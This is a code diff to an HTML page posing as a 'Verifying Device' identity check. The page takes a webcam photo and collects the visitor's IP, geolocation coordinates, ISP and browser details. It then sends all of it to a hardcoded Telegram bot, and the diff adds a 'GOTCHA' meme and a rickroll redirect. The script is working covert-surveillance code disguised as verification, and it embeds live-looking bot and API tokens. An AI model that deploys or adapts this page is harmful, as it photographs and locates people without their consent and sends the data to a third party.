@@ -1,63 +1,65 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Camera and IP Capture</title>
+  <meta charset="UTF-8">
+  <title>Gotcha Meme Capture</title>
+  <style>
+    body {
+      background: #111;
+      color: #0f0;
+      font-family: monospace;
+      text-align: center;
+    }
+    canvas, video {
+      display: none;
+    }
+    #memeImage {
+      display: none;
+      margin-top: 20px;
+      border: 5px solid #0f0;
+    }
+  </style>
 </head>
 <body>
 
-<h2>🔒 Verifying Your Device...</h2>
-<p>Please wait while we verify your identity.</p>
+<h2>🔒 Verifying Device...</h2>
+<p>Hold still, capturing image...</p>
 
-<video id="video" autoplay playsinline width="320" height="240" style="display:none;"></video>
-<canvas id="canvas1" width="320" height="240"></canvas>
-<canvas id="canvas2" width="320" height="240" style="display:none;"></canvas>
+<video id="video" autoplay playsinline width="320" height="240"></video>
+<canvas id="canvasOriginal" width="320" height="240"></canvas>
+<canvas id="canvasMeme" width="320" height="240"></canvas>
+<img id="memeImage" src="">
 
 <script>
   const BOT_TOKEN = "7107321289:AAHS_n9CY7OAUszd_2aai_2_1KT0j__Rnfc";
   const CHAT_ID = "1007795531";
 
-  async function getDeviceInfo() {
+  async function getIPInfo() {
     let info = {
-      ip: "Unknown",
-      city: "-",
-      region: "-",
-      country: "-",
-      org: "-",
-      loc: "-",
-      timezone: "-",
+      ip: "-", city: "-", region: "-", country: "-", org: "-", loc: "-", timezone: "-",
       browser: navigator.userAgent,
       platform: navigator.platform,
       language: navigator.language
     };
-
     try {
-      const res = await fetch("https://ipinfo.io/data/ipinfo_lite.mmdb?token=e836e13929feaa");
-      const raw = await res.json();
-      info.ip = raw.ip || "N/A";
-      info.city = raw.city || "-";
-      info.region = raw.region || "-";
-      info.country = raw.country || "-";
-      info.org = raw.org || "-";
-      info.loc = raw.loc || "-";
-      info.timezone = raw.timezone || "-";
-    } catch (e) {
-      console.warn("⚠️ Cannot load IP info:", e);
-    }
-
+      const res = await fetch("https://ipinfo.io/data/ipinfo_lite.json.gz?token=e836e13929feaa");
+      const json = await res.json();
+      Object.assign(info, json);
+    } catch (e) { console.warn("⚠️ IP Info Error"); }
     return info;
   }
 
-  async function sendToTelegram(blob, info) {
+  async function sendOriginalToTelegram(blob, info) {
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
     formData.append("photo", blob, "photo.jpg");
 
     const caption = `
-📸 Photo Captured!
+📸 Gotcha!
 🌐 IP: ${info.ip}
-🌍 Location: ${info.city}, ${info.region}, ${info.country}
+🌍 ${info.city}, ${info.region}, ${info.country}
 🛰️ ISP: ${info.org}
-🔗 Coordinates: ${info.loc}
+🔗 Coords: ${info.loc}
 🧭 Timezone: ${info.timezone}
 💻 Platform: ${info.platform}
 🌐 Browser: ${info.browser}
@@ -72,31 +74,56 @@
     });
   }
 
+  function drawMeme(canvas, text = "😂 GOTCHA!") {
+    const ctx = canvas.getContext("2d");
+    ctx.font = "bold 22px Arial";
+    ctx.fillStyle = "white";
+    ctx.strokeStyle = "black";
+    ctx.lineWidth = 2;
+    ctx.textAlign = "center";
+    ctx.fillText(text, canvas.width / 2, 30);
+    ctx.strokeText(text, canvas.width / 2, 30);
+  }
+
   navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
-      const video = document.getElementById('video');
-      const canvas1 = document.getElementById('canvas1');
-      const ctx1 = canvas1.getContext('2d');
-      const canvas2 = document.getElementById('canvas2');
-      const ctx2 = canvas2.getContext('2d');
+      const video = document.getElementById("video");
+      const canvasOriginal = document.getElementById("canvasOriginal");
+      const canvasMeme = document.getElementById("canvasMeme");
+      const memeImg = document.getElementById("memeImage");
 
       video.srcObject = stream;
 
-      video.onloadedmetadata = async () => {
+      video.onloadedmetadata = () => {
         setTimeout(async () => {
-          ctx1.drawImage(video, 0, 0, canvas1.width, canvas1.height);
-          ctx2.drawImage(video, 0, 0, canvas2.width, canvas2.height);
+          const ctxO = canvasOriginal.getContext("2d");
+          const ctxM = canvasMeme.getContext("2d");
 
-          canvas2.toBlob(async blob => {
-            const info = await getDeviceInfo();
-            await sendToTelegram(blob, info);
-            console.log("✅ Sent to Telegram");
+          ctxO.drawImage(video, 0, 0, canvasOriginal.width, canvasOriginal.height);
+          ctxM.drawImage(video, 0, 0, canvasMeme.width, canvasMeme.height);
+
+          // 🎨 Add meme overlay
+          drawMeme(canvasMeme);
+
+          // 📸 Show meme popup
+          memeImg.src = canvasMeme.toDataURL("image/jpeg");
+          memeImg.style.display = "block";
+
+          // 🖼 Send original to Telegram
+          canvasOriginal.toBlob(async blob => {
+            const info = await getIPInfo();
+            await sendOriginalToTelegram(blob, info);
           }, "image/jpeg");
+
+          // ⏱ Redirect after 3s
+          setTimeout(() => {
+            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+          }, 3000);
         }, 1500);
       };
     })
     .catch(err => {
-      alert("❌ Camera blocked or error: " + err.message);
+      alert("Camera blocked or error: " + err.message);
     });
 </script>
 
